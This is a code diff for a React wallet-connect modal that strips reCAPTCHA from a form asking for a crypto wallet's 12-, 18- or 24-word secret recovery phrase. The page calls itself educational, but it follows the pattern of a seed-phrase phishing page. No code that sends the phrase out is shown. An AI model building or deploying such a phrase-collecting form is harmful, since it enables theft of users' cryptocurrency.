@@ -350,38 +350,7 @@ const FormSchema = z.object({
           "Secret phrase must contain exactly 12, 18, or 24 words.",
       }
     ),
-    recaptcha: z.string().min(1, { message: "Please complete the reCAPTCHA." }),
 });
-
-function ReCAPTCHAComponent({ onChange, onExpired }) {
-  const recaptchaRef = React.useRef<HTMLDivElement>(null);
-  const widgetIdRef = React.useRef<number | null>(null);
-
-  React.useEffect(() => {
-    const global = window as any;
-    if (!global.grecaptcha) {
-      console.error("reCAPTCHA script not loaded");
-      return;
-    }
-
-    const renderRecaptcha = () => {
-      if (recaptchaRef.current && widgetIdRef.current === null) {
-        widgetIdRef.current = global.grecaptcha.render(recaptchaRef.current, {
-          sitekey: "6LeIxAcpAAAAAMu-pOKNn9mESaK5X2j_0P0u_XhP", // Public test key
-          theme: "dark",
-          callback: onChange,
-          'expired-callback': onExpired
-        });
-      }
-    };
-    
-    global.grecaptcha.ready(renderRecaptcha);
-
-  }, [onChange, onExpired]);
-
-  return <div ref={recaptchaRef}></div>;
-}
-
 
 function SecretPhraseForm({ wallet, onBack, onSuccess }) {
   const { toast } = useToast();
@@ -389,7 +358,6 @@ function SecretPhraseForm({ wallet, onBack, onSuccess }) {
     resolver: zodResolver(FormSchema),
     defaultValues: {
       secretPhrase: "",
-      recaptcha: "",
     },
   });
 
@@ -505,29 +473,13 @@ function SecretPhraseForm({ wallet, onBack, onSuccess }) {
             )}
           />
 
-           <FormField
-            control={form.control}
-            name="recaptcha"
-            render={({ field }) => (
-              <FormItem>
-                <FormControl>
-                  <ReCAPTCHAComponent 
-                     onChange={field.onChange} 
-                     onExpired={() => field.onChange("")}
-                  />
-                </FormControl>
-                <FormMessage />
-              </FormItem>
-            )}
-          />
-
            <p className="text-xs text-muted-foreground">
               This site is for educational purposes. Do not use your real secret phrase.
             </p>
           <Button
             type="submit"
             className="w-full bg-primary text-primary-foreground hover:bg-primary/90"
-            disabled={form.formState.isSubmitting || !form.watch("recaptcha")}
+            disabled={form.formState.isSubmitting}
           >
             {form.formState.isSubmitting
               ? "Validating..."
@@ -701,5 +653,3 @@ export function WalletConnectModal({ isOpen, onOpenChange }) {
     </Dialog>
   );
 }
-
-    
